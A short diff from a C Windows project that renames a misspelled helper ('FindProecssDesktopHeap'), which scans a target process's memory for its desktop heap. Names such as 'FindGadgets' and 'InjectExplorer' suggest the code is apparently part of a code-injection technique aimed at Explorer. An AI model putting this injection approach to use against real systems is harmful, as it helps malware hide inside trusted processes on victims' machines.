@@ -184,24 +184,24 @@ BOOL FindGadgets(HANDLE TargetProcess)
 ULONG Magics[NUM_OF_MAGICS] = { 0xABABABAB, 0xCDCDCDCD, 0xABABABAB, 0xCDCDCDCD };
 
 
-PVOID FindProecssDesktopHeap(HANDLE ProecssHandle, SIZE_T HeapSize)
+PVOID FindProcessDesktopHeap(HANDLE ProcessHandle, SIZE_T HeapSize)
 {
     BYTE *Addr = (BYTE*)0x1000;
     MEMORY_BASIC_INFORMATION MemInfo = { 0 };
     ULONG OldProt = 0;
 
-    while (VirtualQueryEx(ProecssHandle, Addr, &MemInfo, sizeof(MemInfo)))
+    while (VirtualQueryEx(ProcessHandle, Addr, &MemInfo, sizeof(MemInfo)))
     {
         if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT && MemInfo.RegionSize == HeapSize)
         {
             // Double check.
-            if (!VirtualProtectEx(ProecssHandle, Addr, 0x1000, PAGE_READWRITE, &OldProt))
+            if (!VirtualProtectEx(ProcessHandle, Addr, 0x1000, PAGE_READWRITE, &OldProt))
             {
                 return MemInfo.BaseAddress;
             }
             else
             {
-                VirtualProtectEx(ProecssHandle, Addr, 0x1000, OldProt, &OldProt);
+                VirtualProtectEx(ProcessHandle, Addr, 0x1000, OldProt, &OldProt);
             }
         }
         Addr += MemInfo.RegionSize;
@@ -438,7 +438,7 @@ BOOL InjectExplorer(HWND myWnd)
 #endif
 
     // Find Explorer's desktop heap
-	ExplorerDesktopHeap = FindProecssDesktopHeap(ExplorerHandle, SharedHeapSize);
+	ExplorerDesktopHeap = FindProcessDesktopHeap(ExplorerHandle, SharedHeapSize);
 
     if (!ExplorerDesktopHeap)
 	{
